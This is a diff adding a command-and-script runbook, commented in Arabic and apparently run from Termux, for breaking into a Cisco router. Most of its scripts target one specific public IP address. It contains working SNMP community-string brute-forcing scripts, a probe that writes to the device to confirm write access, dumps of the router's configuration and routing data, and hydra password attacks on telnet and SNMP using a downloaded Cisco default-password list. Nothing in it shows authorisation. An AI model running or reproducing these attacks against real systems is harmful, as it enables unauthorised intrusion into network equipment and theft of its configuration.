@@ -1,0 +1,150 @@
+# confirm RW access (CISCO-CONFIG-MAN-MIB)
+snmpget -v2c -c private <target> 1.3.6.1.4.1.9.9.96.1.1.1.1.14.101
+
+# walk the config MIB
+snmpwalk -v2c -c <comm> <target> 1.3.6.1.4.1.9.9.96
+
+# neighbors/routes/topology via SNMP
+snmpwalk -v2c -c <comm> <target> 1.3.6.1.2.1.4.20   # ipRouteTable
+snmpwalk -v2c -c <comm> <target> 1.3.6.1.2.1.17      # bridge MIB
+snmpwalk -v2c -c <comm> <target> 1.3.6.1.2.1.2.2.1.2 # interface names
+
+# check for other management surfaces
+nmap -p 22,80,443,514,69 -sU -sS <target>
+
+pkg update && pkg upgrade -y
+pkg install nmap hydra python python-pip netcat-openbsd curl -y
+pip install pysnmp
+
+# معلومات الجهاز + الواجهات + الاتصالات + العمليات
+nmap -sU -p 161 --script snmp-info,snmp-interfaces,snmp-netstat,snmp-processes <IP>
+
+# تخمين الـ community strings (public / private / cisco ...)
+nmap -sU -p 161 --script snmp-brute --script-args snmp-brute.communitiesdb=/data/data/com.termux/files/usr/share/nmap/nselib/data/snmpcommunities.lst <IP>
+
+cat > walk.py << 'EOF'
+from pysnmp.hlapi import *
+
+def walk(ip, comm, oid='1.3.6.1.2.1.1'):
+    for err, st, idx, varbinds in nextCmd(
+        SnmpEngine(), CommunityData(comm),
+        UdpTransportTarget((ip, 161)), ContextData(),
+        ObjectType(ObjectIdentity(oid)), lexicographicMode=False):
+        if err or st:
+            break
+        for v in varbinds:
+            print(' = '.join(x.prettyPrint() for x in v))
+
+walk('<IP>', '<community>', '1.3.6.1.4.1.9.9.96')   # CISCO-CONFIG-MAN-MIB
+EOF
+python walk.py
+
+OID	المحتوى
+1.3.6.1.2.1.1	معلومات النظام
+1.3.6.1.2.1.4.20	جدول التوجيه ipRouteTable
+1.3.6.1.2.1.2.2.1.2	أسماء الواجهات
+1.3.6.1.4.1.9.9.96	إعدادات/config الراوتر
+
+# تحميل قائمة كلمات السر الافتراضية لـ Cisco
+curl -L -o cisco.txt https://raw.githubusercontent.com/rapid7/metasploit-framework/master/data/wordlists/cisco_default.txt
+
+# هجوم على المنفذ 23
+hydra -l cisco -P cisco.txt telnet://<IP> -t 4 -f
+hydra -l admin -P cisco.txt telnet://<IP> -t 4 -f
+
+
+nmap -sU -p 123 --script ntp-info,ntp-monlist <IP>    # فحص NTP
+nmap -sS -p 22,23,80,443,500,4500,514,69 <IP>         # خدمات إدارة أخرى
+nmap -sU -p 500,4500,69,161,123,514 <IP>              # UDP
+
+# التقاط الحزم على منفذ 23 — للتأكد إن كانت البيانات تُرسل كنص واضح
+tcpdump -i any port 23 -w telnet.pcap
+
+# اتصال Telnet يدوي
+telnet <IP>
+
+cat > snmpbrute.py << 'EOF'
+from pysnmp.hlapi import *
+
+ip = '105.155.252.6'
+communities = ['public','private','cisco','CISCO','test','maroc','router','admin',
+               'default','secret','write','read','monitor','all','manager','telecom',
+               'telco','sysadmin','root','enable','P@ssw0rd','password','snmp','community']
+oid = ObjectIdentity('1.3.6.1.2.1.1.5.0')  # sysName
+
+for c in communities:
+    for mp in (0, 1):  # جرب SNMPv1 ثم v2c
+        err, st, idx, vb = next(
+            getCmd(SnmpEngine(), CommunityData(c, mpModel=mp),
+                   UdpTransportTarget((ip, 161), timeout=1, retries=0),
+                   ContextData(), ObjectType(oid)))
+        if err is None and st == 0:
+            print(f'[+] FOUND: {c} (v{mp+1}) -> sysName={vb[0].prettyPrint()}')
+            break
+    else:
+        print(f'[-] {c}')
+EOF
+python snmpbrute.py
+
+cat > snmprw.py << 'EOF'
+from pysnmp.hlapi import *
+
+ip = '105.155.252.6'
+for c in ['private','cisco','secret','write','test','admin']:
+    err, st, idx, vb = next(
+        setCmd(SnmpEngine(), CommunityData(c, mpModel=0),
+               UdpTransportTarget((ip, 161), timeout=2, retries=0),
+               ContextData(),
+               ObjectType(ObjectIdentity('1.3.6.1.2.1.1.4.0'), 'pentest-probe')))
+    if err is None and st == 0:
+        print(f'[+] RW community: {c}')
+        break
+    else:
+        print(f'[-] write failed: {c}')
+EOF
+python snmprw.py
+
+cat > snmpdump.py << 'EOF'
+from pysnmp.hlapi import *
+
+ip = '105.155.252.6'
+comm = 'private'  # ← غيّرها للنتيجة اللي طلعت من السكربت الأول
+
+def walk(root):
+    for err, st, idx, varbinds in nextCmd(
+        SnmpEngine(), CommunityData(comm, mpModel=0),
+        UdpTransportTarget((ip, 161), timeout=2, retries=0),
+        ContextData(), ObjectType(ObjectIdentity(root)), lexicographicMode=False):
+        if err or st:
+            break
+        for v in varbinds:
+            print(v[0].prettyPrint(), '=', v[1].prettyPrint())
+
+print('=== System ===');       walk('1.3.6.1.2.1.1')
+print('=== Interfaces ===');   walk('1.3.6.1.2.1.2.2.1.2')
+print('=== Routing ===');      walk('1.3.6.1.2.1.4.20')
+print('=== Config MIB ===');   walk('1.3.6.1.4.1.9.9.96')
+EOF
+python snmpdump.py
+
+hydra -P cisco.txt snmp://105.155.252.6 -t 4
+nmap -sT -Pn -p 22,23,80,443,500,4500,514,69 105.155.252.6
+
+
+cat > ntpcheck.py << 'EOF'
+import socket
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+s.settimeout(3)
+s.sendto(b'\x1b' + b'\x00'*47, ('105.155.252.6', 123))
+try:
+    d, _ = s.recvfrom(512)
+    print('NTP alive,', len(d), 'bytes')
+except Exception as e:
+    print('NTP no response:', e)
+EOF
+python ntpcheck.py
+
+pkg install tsu
+tsu          # يفتح شل root
+nmap -sU -p 161 --script snmp-info,snmp-interfaces,snmp-netstat,snmp-processes 105.155.252.6
+
